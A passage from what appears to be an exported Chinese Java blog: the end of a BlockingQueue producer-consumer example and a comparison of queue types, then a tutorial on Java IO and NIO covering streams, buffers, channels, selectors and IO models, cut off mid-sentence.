//消费者 public static class Consumer implements Runnable&#123; private final BlockingQueue&lt;Integer&gt; blockingQueue; private volatile boolean flag; public Consumer(BlockingQueue&lt;Integer&gt; blockingQueue) &#123; this.blockingQueue = blockingQueue; &#125; public void run() &#123; while(!flag)&#123; int info; try &#123; info = blockingQueue.take(); System.out.println(Thread.currentThread().getName()+" consumer "+info); Thread.sleep(50); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; public void shutDown()&#123; flag=true; &#125; &#125; public static void main(String[] args)&#123; BlockingQueue&lt;Integer&gt; blockingQueue = new LinkedBlockingQueue&lt;Integer&gt;(10); //BlockingQueue&lt;Integer&gt; blockingQueue = new ArrayBlockingQueue&lt;&gt;(10); Producer producer=new Producer(blockingQueue); Consumer consumer=new Consumer(blockingQueue); //创建5个生产者，5个消费者 for(int i=0;i&lt;10;i++)&#123; if(i&lt;5)&#123; new Thread(producer,"producer"+i).start(); &#125;else&#123; new Thread(consumer,"consumer"+(i-5)).start(); &#125; &#125; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; producer.shutDown(); consumer.shutDown(); &#125;&#125; 运行效果： 12345678producer1 produce 95producer3 produce 36consumer0 consumer 95consumer2 consumer 36producer0 produce 27consumer4 consumer 27producer2 produce 75...... ArrayBlockingQueue和LinkedBlockingQueue的区别 队列中锁的实现不同 ArrayBlockingQueue实现的队列中的锁是没有分离的，即生产和消费用的是同一个锁；另外，可以指定是否为公平锁，默认是非公平锁。 LinkedBlockingQueue实现的队列中的锁是分离的，在队头和队尾各持有一把锁，入队和出队之间不存在竞争。即生产用的是putLock，消费是takeLock，这也意味着在高并发的情况下生产者和消费者可以并行地操作队列中的数据，以此来提高整个队列的并发性能。 在生产或消费时操作不同 ArrayBlockingQueue实现的队列中在生产和消费的时候，是直接将枚举对象插入或移除的； LinkedBlockingQueue实现的队列中在生产和消费的时候，需要把枚举对象转换为Node&lt;E&gt;进行插入或移出(会生成一个额外的Node对象，这在长时间内需要高效并发地处理大批量数据的系统中，其对于GC的影响还是存在一定的区别。) 队列大小初始化方式不同 ArrayBlockingQueue实现的队列中必须指定队列的大小； LinkedBlockingQueue实现的队列中可以不指定队列的大小，但是默认是Integer.MAX_VALUE 作为开发者，我们需要注意的是，如果构造一个LinkedBlockingQueue对象，而没有指定其容量大小，LinkedBlockingQueue会默认一个类似无限大小的容量（Integer.MAX_VALUE），这样的话，如果生产者的速度一旦大于消费者的速度，也许还没有等到队列满阻塞产生，系统内存就有可能已被消耗殆尽了。 在使用ArrayBlockingQueue和LinkedBlockingQueue分别对1000000个简单字符做入队操作时，LinkedBlockingQueue的消耗是ArrayBlockingQueue消耗的10倍左右，即LinkedBlockingQueue消耗在1500毫秒左右，而ArrayBlockingQueue只需150毫秒左右。 按照实现原理来分析，ArrayBlockingQueue完全可以采用分离锁，从而实现生产者和消费者操作的完全并行运行。Doug Lea之所以没这样去做，也许是因为ArrayBlockingQueue的数据写入和获取操作已经足够轻巧，以至于引入独立的锁机制，除了给代码带来额外的复杂性外，其在性能上完全占不到任何便宜。]]></content>
      <tags>
        <tag>java并发进阶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[9.Java IO]]></title>
    <url>%2F2018%2F07%2F21%2F9.Java%20IO%2F</url>
    <content type="text"><![CDATA[本篇文章探讨Java IO方面的知识。 一、概览Java 的 I/O 大概可以分成以下几类： 磁盘操作：File 字节操作：InputStream 和 OutputStream 字符操作：Reader 和 Writer 对象操作：Serializable 网络操作：Socket 新的输入/输出：NIO 二、磁盘操作File 类可以用于表示文件和目录，但是它只用于表示文件的信息，而不表示文件的内容。 三、字节操作 Java I/O 使用了装饰者模式来实现。以 InputStream 为例，InputStream 是抽象组件，FileInputStream 是 InputStream 的子类，属于具体组件，提供了字节流的输入操作。FilterInputStream 属于抽象装饰者，装饰者用于装饰组件，为组件提供额外的功能，例如 BufferedInputStream 为 FileInputStream 提供缓存的功能。 实例化一个具有缓存功能的字节流对象时，只需要在 FileInputStream 对象上再套一层 BufferedInputStream 对象即可。 1BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file)); DataInputStream装饰者提供了对更多数据类型进行输入的操作，比如 int、double 等基本类型。 批量读入文件内容到字节数组： 123456byte[] buf = new byte[20*1024];int bytes = 0;// 最多读取 buf.length 个字节，返回的是实际读取的个数，返回 -1 的时候表示读到 eof，即文件尾while((bytes = in.read(buf, 0 , buf.length)) != -1) &#123; // ...&#125; 四、字符操作不管是磁盘还是网络传输，最小的存储单元都是字节，而不是字符，所以 I/O 操作的都是字节而不是字符。但是在程序中操作的通常是字符形式的数据，因此需要提供对字符进行操作的方法。 InputStreamReader 实现从文本文件的字节流解码成字符流；OutputStreamWriter 实现字符流编码成为文本文件的字节流。它们继承自 Reader 和 Writer。 编码就是把字符转换为字节，而解码是把字节重新组合成字符。 12byte[] bytes = str.getBytes(encoding); // 编码String str = new String(bytes, encoding)； // 解码 如果编码和解码过程使用不同的编码方式那么就出现了乱码。 GBK 编码中，中文占 2 个字节，英文占 1 个字节； UTF-8 编码中，中文占 3 个字节，英文占 1 个字节； UTF-16be 编码中，中文和英文都占 2 个字节。 UTF-16be 中的 be 指的是 Big Endian，也就是大端。相应地也有 UTF-16le，le 指的是 Little Endian，也就是小端。 Java 使用双字节编码 UTF-16be，这不是指 Java 只支持这一种编码方式，而是说 char 这种类型使用 UTF-16be 进行编码。char 类型占 16 位，也就是两个字节，Java 使用这种双字节编码正是为了让一个中文或者一个英文都能使用一个 char 来存储。 五、对象操作序列化就是将一个对象转换成字节序列，方便存储和传输。 序列化：ObjectOutputStream.writeObject() 反序列化：ObjectInputStream.readObject() 序列化的类需要实现 Serializable 接口，它只是一个标准，没有任何方法需要实现。 transient 关键字可以使一些属性不会被序列化。 ArrayList 序列化和反序列化的实现 ：ArrayList 中存储数据的数组是用 transient 修饰的，因为这个数组是动态扩展的，并不是所有的空间都被使用，因此就不需要所有的内容都被序列化。通过重写序列化和反序列化方法，使得可以只序列化数组中有内容的那部分数据。 1private transient Object[] elementData; 六、网络操作Java 中的网络支持： InetAddress：用于表示网络上的硬件资源，即 IP 地址； URL：统一资源定位符，通过 URL 可以直接读取或者写入网络上的数据； Sockets：使用 TCP 协议实现网络通信； Datagram：使用 UDP 协议实现网络通信。 InetAddress没有公有构造函数，只能通过静态方法来创建实例。 12InetAddress.getByName(String host);InetAddress.getByAddress(byte[] addr); URL可以直接从 URL 中读取字节流数据 123456789101112URL url = new URL("http://www.baidu.com");InputStream is = url.openStream(); // 字节流InputStreamReader isr = new InputStreamReader(is, "utf-8"); // 字符流BufferedReader br = new BufferedReader(isr);String line = br.readLine();while (line != null) &#123; System.out.println(line); line = br.readLine();&#125;br.close();isr.close();is.close(); Sockets ServerSocket：服务器端类 Socket：客户端类 服务器和客户端通过 InputStream 和 OutputStream 进行输入输出。 Datagram DatagramPacket：数据包类 DatagramSocket：通信类 七、NIO新的输入/输出 (NIO) 库是在 JDK 1.4 中引入的。NIO 弥补了原来的 I/O 的不足，提供了高速的、面向块的 I/O。 阻塞I/O通信模型假如现在你对阻塞I/O已有了一定了解，我们知道阻塞I/O在调用InputStream.read()方法时是阻塞的，它会一直等到数据到来时（或超时）才会返回；同样，在调用ServerSocket.accept()方法时，也会一直阻塞到有客户端连接才会返回，每个客户端连接过来后，服务端都会启动一个线程去处理该客户端的请求。阻塞I/O的通信模型示意图如下： 缺点： 当客户端多时，会创建大量的处理线程。且每个线程都要占用栈空间和一些CPU时间 阻塞可能带来频繁的上下文切换，且大部分上下文切换可能是无意义的。 java NIO原理及通信模型下面是java NIO的工作原理： 由一个专门的线程来处理所有的 IO 事件，并负责分发。 事件驱动机制：事件到的时候触发，而不是同步的去监视事件。 线程通讯：线程之间通过 wait,notify 等方式通讯。保证每次上下文切换都是有意义的。减少无谓的线程切换。 Java NIO的服务端只需启动一个专门的线程来处理所有的 IO 事件，这种通信模型是怎么实现的呢？java NIO采用了双向通道（channel）进行数据传输，而不是单向的流（stream），在通道上可以注册我们感兴趣的事件。一共有以下四种事件： 事件名 对应值 服务端接收客户端连接事件 SelectionKey.OP_ACCEPT(16) 客户端连接服务端事件 SelectionKey.OP_CONNECT(8) 读事件 SelectionKey.OP_READ(1) 写事件 SelectionKey.OP_WRITE(4) 服务端和客户端各自维护一个管理通道的对象，我们称之为selector，该对象能检测一个或多个通道 (channel) 上的事件。我们以服务端为例，如果服务端的selector上注册了读事件，某时刻客户端给服务端发送了一些数据，阻塞I/O这时会调用read()方法阻塞地读取数据，而NIO的服务端会在selector中添加一个读事件。服务端的处理线程会轮询地访问selector，如果访问selector时发现有感兴趣的事件到达，则处理这些事件，如果没有感兴趣的事件到达，则处理线程会一直阻塞直到感兴趣的事件到达为止。下面是我理解的java NIO的通信模型示意图： 关于阻塞与非阻塞，同步与非同步的理解我们都知道常见的IO有四种方式，同步阻塞，同步非阻塞，异步阻塞，异步非阻塞。然而对于同步和阻塞的理解却一直很模糊。 同步与异步 所谓同步就是一个任务的完成需要依赖另外一个任务时，只有等待被依赖的任务完成后，依赖的任务才能算完成，这是一种可靠的任务序列。要么成功都成功，失败都失败，两个任务的状态可以保持一致。 而异步是不需要等待被依赖的任务完成，只是通知被依赖的任务要完成什么工作，依赖的任务也立即执行，只要自己完成了整个任务就算完成了。至于被依赖的任务最终是否真正完成，依赖它的任务无法确定，所以它是不可靠的任务序列。 我们可以用打电话（同步）和发短信（异步）来很好的比喻同步与异步操作。 阻塞和非阻塞 阻塞就是 CPU 停下来等待一个慢的操作完成 CPU 才接着完成其它的事。 非阻塞就是在这个慢的操作在执行时 CPU 去干其它别的事，等这个慢的操作完成时，CPU 再接着完成后续的操作。 虽然表面上看非阻塞的方式可以明显的提高 CPU 的利用率，但是也带了另外一种后果就是系统的线程切换增加。 什么是阻塞IO？什么是非阻塞IO？在了解阻塞IO和非阻塞IO之前，先看下一个具体的IO操作过程是怎么进行的。 通常来说，IO操作包括：对硬盘的读写、对socket的读写以及外设的读写。 当用户线程发起一个IO请求操作（本文以读请求操作为例），内核会去查看要读取的数据是否就绪，对于阻塞IO来说，如果数据没有就绪，则会一直在那等待，直到数据就绪；对于非阻塞IO来说，如果数据没有就绪，则会返回一个标志信息告知用户线程当前要读的数据没有就绪。当数据就绪之后，便将数据拷贝到用户线程，这样才完成了一个完整的IO读请求操作，也就是说一个完整的IO读请求操作包括两个阶段： 查看数据是否就绪； 进行数据拷贝（内核将数据拷贝到用户线程）。 那么阻塞（blocking IO）和非阻塞（non-blocking IO）的区别就在于第一个阶段，如果数据没有就绪，在查看数据是否就绪的过程中是一直等待，还是直接返回一个标志信息。 Java中传统的IO都是阻塞IO，比如通过socket来读数据，调用read()方法之后，如果数据没有就绪，当前线程就会一直阻塞在read方法调用那里，直到有数据才返回；而如果是非阻塞IO的话，当数据没有就绪，read()方法应该返回一个标志信息，告知当前线程数据没有就绪，而不是一直在那里等待。 什么是同步IO？什么是异步IO？我们知道了，阻塞和非阻塞是判断数据是否就绪时如何处理，即IO操作的第一阶段。 那么什么是同步IO和异步IO呢？ 我们知道，同步是打电话，异步是发短信，打电话需要等到电话通了才能进行下一步，发短信就不用操心那么多了，我发出去就行了，至于什么时候发送、如何发送以及如何保证我这个短信一定能发出去，我是不管的。 同步IO即 如果一个线程请求进行IO操作，在IO操作完成之前，该线程会被阻塞；而异步IO为 如果一个线程请求进行IO操作，IO操作不会导致请求线程被阻塞。 描述的是用户线程与内核的交互方式： 同步是指用户线程发起 I/O 请求后需要等待或者轮询内核 I/O操作完成后才能继续执行； 异步是指用户线程发起I/O请求后仍继续执行，当内核I/O操作完成后会通知用户线程，或者调用用户线程注册的回调函数。 Channel（通道）通道，顾名思义，就是通向什么的道路，为某个提供了渠道。在传统IO中，我们要读取一个文件中的内容，通常是像下面这样读取的： 123456789public class Test &#123; public static void main(String[] args) throws IOException &#123; File file = new File("data.txt"); InputStream inputStream = new FileInputStream(file); byte[] bytes = new byte[1024]; inputStream.read(bytes); inputStream.close(); &#125; &#125; 这里的InputStream实际上就是为读取文件提供一个通道的。因此可以将NIO 中的Channel同传统IO中的Stream来类比，但是要注意，传统IO中，Stream是单向的，比如InputStream只能进行读取操作，OutputStream只能进行写操作。而Channel是双向的，既可用来进行读操作，又可用来进行写操作。 通道包括以下类型： FileChannel：从文件中读写数据； DatagramChannel：通过 UDP 读写网络中数据； SocketChannel：通过 TCP 读写网络中数据； ServerSocketChannel：可以监听新进来的 TCP 连接，对每一个新进来的连接都会创建一个 SocketChannel 下面给出通过FileChannel来向文件中写入数据的一个例子： 1234567891011121314 public class Test &#123; public static void main(String[] args) throws IOException &#123; File file = new File("data.txt"); FileOutputStream outputStream = new FileOutputStream(file); FileChannel channel = outputStream.getChannel(); ByteBuffer buffer = ByteBuffer.allocate(1024); String string = "java nio"; buffer.put(string.getBytes()); buffer.flip(); //此处必须要调用buffer的flip方法 channel.write(buffer); channel.close(); outputStream.close(); &#125; &#125; Buffer（缓冲区）Buffer（缓冲区），是NIO中非常重要的一个东西，在NIO中所有数据的读和写都离不开Buffer。比如上面的一段代码中，读取的数据时放在byte数组当中，而在NIO中，读取的数据只能放在Buffer中。同样地，写入数据也是先写入到Buffer中。 上面的图描述了从一个客户端向服务端发送数据，然后服务端接收数据的过程。客户端发送数据时，必须先将数据存入Buffer中，然后将Buffer中的内容写入通道。服务端这边接收数据必须通过Channel将数据读入到Buffer中，然后再从Buffer中取出数据来处理。 缓冲区实质上是一个数组，但它不仅仅是一个数组。缓冲区提供了对数据的结构化访问，而且还可以跟踪系统的读/写进程。 缓冲区包括以下类型： ByteBuffer CharBuffer ShortBuffer IntBuffer LongBuffer FloatBuffer DoubleBuffer 如果是对于文件读写，上面几种Buffer都可能会用到。但是对于网络读写来说，用的最多的是ByteBuffer。 缓冲区状态变量 capacity：最大容量； position：当前已经读写的字节数； limit：还可以读写的字节数。 状态变量的改变过程举例： ① 新建一个大小为 8 个字节的缓冲区，此时 position 为 0，而 limit = capacity = 8。capacity 变量不会改变，下面的讨论会忽略它。 ② 从输入通道中读取 5 个字节数据写入缓冲区中，此时 position 移动设置为 5，limit 保持不变。 ③ 在将缓冲区的数据写到输出通道之前，需要先调用 flip() 方法，这个方法将 limit 设置为当前 position，并将 position 设置为 0。 buffer中的flip方法涉及到bufer中的Capacity,Position和Limit三个概念。其中Capacity在读写模式下都是固定的，就是我们分配的缓冲大小,Position类似于读写指针，表示当前读(写)到什么位置,Limit在写模式下表示最多能写入多少数据，此时和Capacity相同，在读模式下表示最多能读多少数据，此时和缓存中的实际数据大小相同。在写模式下调用flip方法，那么limit就设置为了position当前的值(即当前写了多少数据),postion会被置为0，以表示读操作从缓存的头开始读。也就是说调用flip之后，读写指针指到缓存头部，并且设置了最多只能读出之前写入的数据长度(而不是整个缓存的容量大小)。 ④ 从缓冲区中取 4 个字节到输出缓冲中，此时 position 设为 4。 ⑤ 最后需要调用 clear() 方法来清空缓冲区，此时 position 和 limit 都被设置为最初位置。 文件 NIO 实例以下展示了使用 NIO 快速复制文件的实例： 12345678910111213141516171819202122232425262728293031323334public class FastCopyFile &#123; public static void main(String args[]) throws Exception &#123; String inFile = "data/abc.txt"; String outFile = "data/abc-copy.txt"; // 获得源文件的输入字节流 FileInputStream fin = new FileInputStream(inFile); // 获取输入字节流的文件通道 FileChannel fcin = fin.getChannel(); // 获取目标文件的输出字节流 FileOutputStream fout = new FileOutputStream(outFile); // 获取输出字节流的通道 FileChannel fcout = fout.getChannel(); // 为缓冲区分配 1024 个字节 ByteBuffer buffer = ByteBuffer.allocateDirect(1024); while (true) &#123; // 从输入通道中读取数据到缓冲区中 int r = fcin.read(buffer); // read() 返回 -1 表示 EOF if (r == -1) break; // 切换读写---不可少 buffer.flip(); // 把缓冲区的内容写入输出文件中 fcout.write(buffer); // 清空缓冲区 buffer.clear(); &#125; &#125;&#125; Selector（选择器）可以说它是NIO中最关键的一个部分，Selector的作用就是用来轮询每个注册的Channel，一旦发现Channel有注册的事件发生，便获取事件然后进行处理。 用单线程处理一个Selector，然后通过Selector.select()方法来获取到达事件，在获取了到达事件之后，就可以逐个地对这些事件进行响应处理。 因为创建和切换线程的开销很大，因此使用一个线程来处理多个事件而不是一个线程处理一个事件具有更好的性能。 下面从编程的角度具体来看看选择器是如何实现的。 1. 创建选择器1Selector selector = Selector.open(); 2. 将通道注册到选择器上123ServerSocketChannel ssChannel = ServerSocketChannel.open();ssChannel.configureBlocking(false);ssChannel.register(selector, SelectionKey.OP_ACCEPT); 通道必须配置为非阻塞模式，否则使用选择器就没有任何意义了，因为如果通道在某个事件上被阻塞，那么服务器就不能响应其它时间，必须等待这个事件处理完毕才能去处理其它事件，显然这和选择器的作用背道而驰。 在将通道注册到选择器上时，还需要指定要注册的具体事件，主要有以下几类： SelectionKey.OP_CONNECT SelectionKey.OP_ACCEPT SelectionKey.OP_READ SelectionKey.OP_WRITE 它们在 SelectionKey 的定义如下： 1234public static final int OP_READ = 1 &lt;&lt; 0;public static final int OP_WRITE = 1 &lt;&lt; 2;public static final int OP_CONNECT = 1 &lt;&lt; 3;public static final int OP_ACCEPT = 1 &lt;&lt; 4; 可以看出每个事件可以被当成一个位域，从而组成事件集整数。例如： 1int interestSet = SelectionKey.OP_READ | SelectionKey.OP_WRITE; 3. 监听事件1int num = selector.select(); 使用 select() 来监听事件到达，它会一直阻塞直到有至少一个事件到达。 4. 获取到达的事件1234567891011Set&lt;SelectionKey&gt; keys = selector.selectedKeys();Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator();while (keyIterator.hasNext()) &#123; SelectionKey key = keyIterator.next(); if (key.isAcceptable()) &#123; // ... &#125; else if (key.isReadable()) &#123; // ... &#125; keyIterator.remove();&#125; 5. 事件循环因为一次 select() 调用不能处理完所有的事件，并且服务器端有可能需要一直监听事件，因此服务器端处理事件的代码一般会放在一个死循环内。 1234567891011121314while (true) &#123; int num = selector.select(); Set&lt;SelectionKey&gt; keys = selector.selectedKeys(); Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator(); while (keyIterator.hasNext()) &#123; SelectionKey key = keyIterator.next(); if (key.isAcceptable()) &#123; // ... &#125; else if (key.isReadable()) &#123; // ... &#125; keyIterator.remove(); &#125;&#125; 流与块I/O 与 NIO 最重要的区别是数据打包和传输的方式，I/O 以流的方式处理数据，而 NIO 以块的方式处理数据。 面向流的 I/O 一次处理一个字节数据，一个输入流产生一个字节数据，一个输出流消费一个字节数据。为流式数据创建过滤器非常容易，链接几个过滤器，以便每个过滤器只负责复杂处理机制的一部分。不利的一面是，面向流的 I/O 通常相当慢。 面向块的 I/O 一次处理一个数据块，按块处理数据比按流处理数据要快得多。但是面向块的 I/O 缺少一些面向流的 I/O 所具有的优雅性和简单性。 I/O 包和 NIO 已经很好地集成了，java.io.* 已经以 NIO 为基础重新实现了，所以现在它可以利用 NIO 的一些特性。例如，java.io.* 包中的一些类包含以块的形式读写数据的方法，这使得即使在面向流的系统中，处理速度也会更快。 一个完整 NIO 实例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public class NIOServer &#123; public static void main(String[] args) throws IOException &#123; Selector selector = Selector.open(); ServerSocketChannel ssChannel = ServerSocketChannel.open(); ssChannel.configureBlocking(false); ssChannel.register(selector, SelectionKey.OP_ACCEPT); ServerSocket serverSocket = ssChannel.socket(); InetSocketAddress address = new InetSocketAddress("127.0.0.1", 8888); serverSocket.bind(address); while (true) &#123; selector.select(); Set&lt;SelectionKey&gt; keys = selector.selectedKeys(); Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator(); while (keyIterator.hasNext()) &#123; SelectionKey key = keyIterator.next(); if (key.isAcceptable()) &#123; ServerSocketChannel ssChannel1 = (ServerSocketChannel) key.channel(); // 服务器会为每个新连接创建一个 SocketChannel SocketChannel sChannel = ssChannel1.accept(); sChannel.configureBlocking(false); // 这个新连接主要用于从客户端读取数据 sChannel.register(selector, SelectionKey.OP_READ); &#125; else if (key.isReadable()) &#123; SocketChannel sChannel = (SocketChannel) key.channel(); System.out.println(readDataFromSocketChannel(sChannel)); sChannel.close(); &#125; keyIterator.remove(); &#125; &#125; &#125; private static String readDataFromSocketChannel(SocketChannel sChannel) throws IOException &#123; ByteBuffer buffer = ByteBuffer.allocate(1024); StringBuffer data = new StringBuffer(); while (true) &#123; buffer.clear(); int n = sChannel.read(buffer); if (n == -1) break; buffer.flip(); int limit = buffer.limit(); char[] dst = new char[limit]; for (int i = 0; i &lt; limit; i++) dst[i] = (char) buffer.get(i); data.append(dst); buffer.clear(); &#125; return data.toString(); &#125;&#125; 12345678910public class NIOClient &#123; public static void main(String[] args) throws IOException &#123; Socket socket = new Socket("127.0.0.1", 8888); OutputStream out = socket.getOutputStream(); String s = "hello world"; out.write(s.getBytes()); out.close(); &#125;&#125; 内存映射文件内存映射文件 I/O 是一种读和写文件数据的方法，它可以比常规的基于流或者基于通道的 I/O 快得多。 只有文件中实际读取或者写入的部分才会映射到内存中。 现代操作系统一般会根据需要将文件的部分映射为内存的部分，从而实现文件系统。Java 内存映射机制只不过是在底层操作系统中可以采用这种机制时，提供了对该机制的访问。 向内存映射文件写入可能是危险的，仅只是改变数组的单个元素这样的简单操作，就可能会直接修改磁盘上的文件。修改数据与将数据保存到磁盘是没有分开的。 下面代码行将文件的前 1024 个字节映射到内存中，map() 方法返回一个 MappedByteBuffer，它是 ByteBuffer 的子类。因此，您可以像使用其他任何 ByteBuffer 一样使用新映射的缓冲区，操作系统会在需要时负责执行映射。 1MappedByteBuffer mbb = fc.map(FileChannel.MapMode.READ_WRITE, 0, 1024); 总结 NIO其实实现的是一个IO的多路复用，用select来同时监听多个channel，本质上还是同步阻塞的，需要select不断监听端口。但是对于IO各个通道来说就是可以看做是异步。 基本可以认为 “NIO = I/O多路复用 + 非阻塞式I/O”，大部分情况下是单线程，但也有超过一个线程实现NIO的情况 我们可以用打电话（同步）和发短信（异步）来很好的比喻同步与异步操作 阻塞就是 CPU 停下来等待一个慢的操作完成 CPU 才接着完成其它的事。 非阻塞就是在这个慢的操作在执行时 CPU 去干其它别的事，等这个慢的操作完成时，CPU 再接着完成后续的操作。两种方式各有优劣。 传统IO中，Stream是单向的，比如InputStream只能进行读取操作，OutputStream只能进行写操作。而Channel是双向的，既可用来进行读操作，又可用来进行写操作。 在NIO中，读取的数据只能放在Buffer中。同样地，写入数据也是先写入到Buffer中。缓冲区有三个状态变量：capacity：最大容量；position：当前已经读写的字节数；limit：还可以读写的字节数。 Selector的作用就是用来轮询每个注册的Channel，一旦发现Channel有注册的事件发生，便获取事件然后进行处理. NIO和IO的主要区别,下面又总结了一下。 NIO和IO各自适合的场景？ NIO适用场景 服务器需要支持超大量的长时间连接。比如10000个连接以上，并且每个客户端并不会频繁地发送太多数据。例如总公司的一个中心服务器需要收集全国便利店各个收银机的交易信息，只需要少量线程按需处理维护的大量长期连接。 BIO适用场景 适用于连接数目比较小，并且一次发送大量数据的场景，这种方式对服务器资源要求比较高，并发局限于应用中。 面试题什么是NIONIO即New IO，这个库是在JDK1.4中才引入的。NIO和IO有相同的作用和目的，但实现方式不同，NIO主要用到的是块，所以NIO的效率要比IO高很多。在Java API中提供了两套NIO，一套是针对标准输入输出NIO，另一套就是网络编程NIO。 NIO和IO的主要区别 IO NIO 面向流 面向缓冲 阻塞IO 非阻塞IO 无 选择器 面向流与面向缓冲 Java IO和NIO之间第一个最大的区别是，IO是面向流的，NIO是面向缓冲区的。 Java IO面向流意味着每次从流中读一个或多个字节，直至读取所有字节，它们没有被缓存在任何地方。此外，它不能前后移动流中的数据。如果需要前后移动从流中读取的数据，需要先将它缓存到一个缓冲区。 Java NIO的缓冲导向方法略有不同。数据读取到一个它稍后处理的缓冲区，需要时可在缓冲区中前后移动。这就增加了处理过程中的灵活性。但是，还需要检查是否该缓冲区中包含所有您需要处理的数据。而且，需确保当更多的数据读入缓冲区时，不要覆盖缓冲区里尚未处理的数据。 阻塞与非阻塞IO Java IO的各种流是阻塞的。这意味着，当一个线程调用read() 或 write()时，该线程被阻塞，直到有一些数据被读取，或数据完全写入。该线程在此期间不能再干任何事情了。Java NIO的非阻塞模式，使一个线程从某通道发送请求读取数据，但是它仅能得到目前可用的数据，如果目前没有数据可用时，就什么都不会获取，而不是保持线程阻塞，所以直至数据变的可以读取之前，该线程可以继续做其他的事情。 非阻塞写也是如此。一个线程请求写入一些数据到某通道，但不需要等待它完全写入，这个线程同时可以去做别的事情。 线程通常将非阻塞IO的空闲时间用于在其它通道上执行IO操作，所以一个单独的线程现在可以管理多个输入和输出通道（channel）。 选择器（Selectors） Java NIO的选择器允许一个单独的线程来监视多个输入通道，你可以注册多个通道使用一个选择器，然后使用一个单独的线程来“选择”通道：这些通道里已经有可以处理的输入，或者选择已准备写入的通道。这种选择机制，使得一个单独的线程很容易来管理多个通道。 五种IO模型 在《Unix网络编程》一书中提到了五种IO模型，分别是：阻塞IO、非阻塞IO、多路复用IO、信号驱动IO以及异步IO。 阻塞IO模型 最传统的一种IO模型，即在读写数据过程中会发生阻塞现象。 当用户线程发出IO请求之后，内核会去查看数据是否就绪，如果没有就绪就会等待数据就绪，而用户线程就会处于阻塞状态，用户线程交出CPU。当数据就绪之后，内核会将数据拷贝到用户线程，并返回结果给用户线程，用户线程才解除block状态。 典型的阻塞IO模型的例子为： 1data = socket.read(); 如果数据没有就绪，就会一直阻塞在read方法。 非阻塞IO模型 当用户线程发起一个read操作后，并不需要等待，而是马上就得到了一个结果。如果结果是一个error时，它就知道数据还没有准备好，于是它可以再次发送read操作。一旦内核中的数据准备好了，并且又再次收到了用户线程的请求，那么它马上就将数据拷贝到了用户线程，然后返回。 所以事实上，在非阻塞IO模型中，用户线程需要不断地询问内核数据是否就绪，也就说非阻塞IO不会交出CPU，而会一直占用CPU。 所以，用户进程其实是需要不断的主动询问kernel数据好了没有。 典型的非阻塞IO模型一般如下： 1234567while(true)&#123; data = socket.read(); if(data!= error)&#123; 处理数据 break; &#125;&#125; 但是对于非阻塞IO就有一个非常严重的问题，在while循环中需要不断地去询问内核数据是否就绪，这样会导致CPU占用率非常高，因此一般情况下很少使用while循环这种方式来读取数据。 多路复用IO模型 多路复用IO模型是目前使用得比较多的模型。Java NIO实际上就是多路复用IO。 在多路复用IO模型中，会有一个线程不断去轮询多个socket的状态，只有当socket真正有读写事件时，才真正调用实际的IO读写操作。因为在多路复用IO模型中，只需要使用一个线程就可以管理多个socket，系统不需要建立新的进程或者线程，也不必维护这些线程和进程，并且只有在真正有socket读写事件进行时，才会使用IO资源，所以它大大减少了资源占用。 在Java NIO中，是通过selector.select()去查询每个通道是否有到达事件，如果没有事件，则一直阻塞在那里，因此这种方式会导致用户线程的阻塞。当任何一个socket中的数据准备好了，select就会返回。这个时候用户进程再调用read操作，将数据从kernel拷贝到用户进程。 也许有朋友会说，我可以采用 多线程+ 阻塞IO 达到类似的效果，但是由于在多线程 + 阻塞IO 中，每个socket对应一个线程，这样会造成很大的资源占用，并且尤其是对于长连接来说，线程的资源一直不会释放，如果后面陆续有很多连接的话，就会造成性能上的瓶颈。 而多路复用IO模式，通过一个线程就可以管理多个socket，只有当socket真正有读写事件发生才会占用资源来进行实际的读写操作。因此，多路复用IO比较适合连接数比较多的情况。 不过要注意的是，多路复用IO模型是通过轮询的方式来检测是否有事件到达，并且对到达的事件逐一进行响应。因此对于多路复用IO模型来说，一旦事件响应体很大，那么就会导致后续的事件迟迟得不到处理，并且会影响新的事件轮询。 信号驱动IO模型 在信号驱动IO模型中，当用户线程发起一个IO请求操作，会给对应的socket注册一个信号函数，然后用户线程会继续执行，当内核数据就绪时会发送一个信号给用户线程，用户线程接收到信号之后，便在信号函数中调用IO读写操作来进行实际的IO请求操作。 异步IO模型 异步IO模型才是最理想的IO模型，在异步IO模型中，当用户线程发起read操作之后，立刻就可以开始去做其它的事。而另一方面，从内核的角度，当它受到一个asynchronous read之后，它会立刻返回，说明read请求已经成功发起了，因此不会对用户线程产生任何block。然后，内核会等待数据准备完成，然后将数据拷贝到用户线程，当这一切都完成之后，内核会给用户线程发送一个信号，告诉它read操作完成了。也就说用户线程完全不需要实际的整个IO操作是如何进行的，只需要先发起一个请求，当接收内核返回的成功信号时表示IO操作已经完成，可以直接去使用数据了。 也就说在异步IO模型中，IO操作的两个阶段都不会阻塞用户线程，这两个阶段都是由内核自动完成，然后发送一个信号告知用户线程操作已完成。用户线程中不需要再次调用IO函数进行具体的读写。这点是和信号驱动模型有所不同的，在信号驱动模型中，当用户线程接收到信号表示数据已经就绪，然后需要用户线程调用IO函数进行实际的读写操作；而在异步IO模型中，收到信号表示IO操作已经完成，不需要再在用户线程中调用iO函数进行实际的读写操作。 注意，异步IO是需要操作系统的底层支持，在Java 7中，提供了Asynchronous IO。 前面四种IO模型实际上都属于同步IO，只有最后一种是真正的异步IO，因为无论是多路复用IO还是信号驱动模型，IO操作的第2个阶段都会引起用户线程阻塞，也就是内核进行数据拷贝的过程都会让用户线程阻塞。 最后，再举几个不是很恰当的例子来说明这四个IO Model: 有A(阻塞IO)，B(非阻塞IO)，C(多路复用IO)，D(信号驱动IO),E(异步IO)五个人在钓鱼： A用的是最老式的鱼竿，所以呢，得一直守着，等到鱼上钩了再拉杆； B的鱼竿有个功能，能够显示是否有鱼上钩，所以呢，B就和旁边的MM聊天，隔会再看看有没有鱼上钩，有的话就迅速拉杆； C用的鱼竿和B差不多，但他想了一个好办法，就是同时放好几根鱼竿，然后守在旁边，一旦有显示说鱼上钩了，它就将对应的鱼竿拉起来； 